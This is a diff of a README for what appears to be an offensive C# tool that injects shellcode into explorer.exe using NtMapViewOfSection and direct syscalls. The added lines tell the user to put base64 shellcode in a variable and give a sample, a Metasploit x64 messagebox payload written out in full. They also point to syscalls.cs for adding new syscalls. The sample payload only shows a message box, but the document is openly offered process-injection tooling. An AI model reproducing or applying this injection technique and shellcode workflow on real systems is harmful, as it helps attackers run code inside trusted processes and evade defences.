@@ -20,7 +20,13 @@ Inject("explorer", osV, OPENSEC);
 ```
 to inject the shellcode into explorer.exe using the NtMapViewOfSection method. 
 
-#### Dev:
+The shellcode must be in base64 and assigned to the "s" variable on line 91
+```
+//msf messagebox x64
+string s = @"/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYD5Ii1IYPkiLUiA+SItyUD5ID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVE+SItSID6LQjxIAdA+i4CIAAAASIXAdG9IAdBQPotIGD5Ei0AgSQHQ41xI/8k+QYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18T5MA0wkCEU50XXWWD5Ei0AkSQHQZj5BiwxIPkSLQBxJAdA+QYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVo+SIsS6Un///9dScfBAAAAAD5IjZX+AAAAPkyNhQMBAABIMclBukWDVgf/1UgxyUG68LWiVv/VZ2F0bwBNZXNzYWdlQm94AA==";
+```
+
+### Dev:
 
 Take a look at syscalls.cs. To create a new syscall:
 - Add the syscall ID to each windows version inside the sysDic dictionary.  
